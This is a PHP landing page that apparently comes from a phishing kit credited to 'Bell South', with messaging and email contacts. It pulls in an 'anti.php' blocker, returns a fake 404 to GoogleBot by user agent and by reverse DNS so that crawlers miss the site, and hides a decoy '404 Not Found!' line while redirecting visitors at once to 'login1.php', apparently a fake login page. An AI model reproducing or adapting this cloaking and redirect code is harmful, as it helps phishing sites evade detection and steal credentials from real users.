<?php
include('anti.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
<?php
#<!--
#---------------------||-||---------------------#
#        #===============================#
#        #         By Bell South         #
#        #         Icq: @Bell_South      #
#        #        Telegram: @Bell)South  #
#        #       Bellsouth@yahoo.com     #
#        #        fb.com/bell.south      #
#        #         -Contact Me Here-     #
#        #===============================#                     
#
#---------------------||-||---------------------#
#-->
?>
<!DOCTYPE HTML>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<title>Loading...</title>
	<meta http-equiv="Refresh" content="0; url='login1.php'" />
</head>
<body>
	<p style="display:none;">404 Not Found!</p>
</body>
</html>